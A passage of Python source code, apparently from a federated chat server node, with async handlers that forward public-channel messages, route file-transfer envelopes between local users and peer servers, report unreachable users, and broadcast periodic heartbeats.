    async def _handle_msg_public(self, envelope: Envelope) -> None:
        self._mark_seen(envelope)
        forward = Envelope(
            type=EnvelopeType.MSG_PUBLIC_CHANNEL,
            from_id=envelope.from_id,
            to=envelope.to,
            ts=envelope.ts,
            payload=envelope.payload,
        )
        await self._fanout_servers(forward)
        for user_id, link in self.local_users.items():
            user_envelope = Envelope(
                type=EnvelopeType.MSG_PUBLIC_CHANNEL,
                from_id=envelope.from_id,
                to=user_id,
                ts=envelope.ts,
                payload=envelope.payload,
            )
            try:
                await link.send(user_envelope.to_json())
            except Exception:  # noqa: BLE001
                logger.warning("Failed to deliver public message to %s", user_id)

    # Route file transfer envelopes either locally or toward another server.
    async def _handle_file_passthrough(self, envelope: Envelope) -> None:
        payload = dict(envelope.payload)
        target_user = payload.pop("user_id", envelope.to)
        if target_user in self.local_users:
            deliver_payload = dict(envelope.payload)
            deliver_payload.pop("user_id", None)
            deliver = self._build_envelope(envelope.type, to=target_user, payload=deliver_payload)
            await self.local_users[target_user].send(deliver.to_json())
            return
        target_server = self.user_locations.get(target_user)
        if target_server and target_server in self.server_links:
            server_payload = dict(envelope.payload)
            server_payload["user_id"] = target_user
            forward = self._build_envelope(envelope.type, to=target_server, payload=server_payload)
            await self.server_links[target_server].send(forward.to_json())
        else:
            await self._send_error_to_sender(
                envelope,
                ErrorCode.USER_NOT_FOUND,
                detail=f"{target_user} not reachable",
            )

    # Update bookkeeping when heartbeat envelopes arrive.
    async def _handle_heartbeat(self, envelope: Envelope) -> None:
        self.server_addrs.setdefault(envelope.from_id, ("", 0))

    # Send an error response back to the originating user when possible.
    async def _send_error_to_sender(self, envelope: Envelope, code: ErrorCode, detail: str) -> None:
        origin = envelope.from_id
        link = self.local_users.get(origin)
        if link:
            payload = {"code": code.value, "detail": detail}
            err = self._build_envelope(EnvelopeType.ERROR, to=origin, payload=payload)
            await link.send(err.to_json())

    # ------------------------------------------------------------------
    # Periodically broadcast heartbeat envelopes to peers.
    async def _heartbeat_loop(self) -> None:
        interval = self.config.heartbeat_interval
        while True:
            await asyncio.sleep(interval)
            envelope = self._build_envelope(
                EnvelopeType.HEARTBEAT,
                to="*",
                payload={"server_id": self.server_id},
            )
            await self._fanout_servers(envelope)


__all__ = ["ServerNode", "ServerConfig", "BootstrapEntry"]